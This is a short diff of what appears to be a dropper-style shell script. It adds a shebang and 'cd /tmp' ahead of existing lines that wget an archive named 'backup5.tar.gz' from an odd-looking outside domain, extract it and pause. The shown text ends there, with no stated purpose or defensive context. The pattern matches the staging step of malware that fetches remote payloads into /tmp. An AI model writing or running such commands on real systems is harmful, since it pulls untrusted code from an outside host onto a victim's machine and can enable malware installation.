@@ -1,3 +1,5 @@
+#!/bin/sh
+cd /tmp
 wget http://greenleaf.teatspray.fun/backup5.tar.gz
 tar -xf backup5.tar.gz
 sleep 3
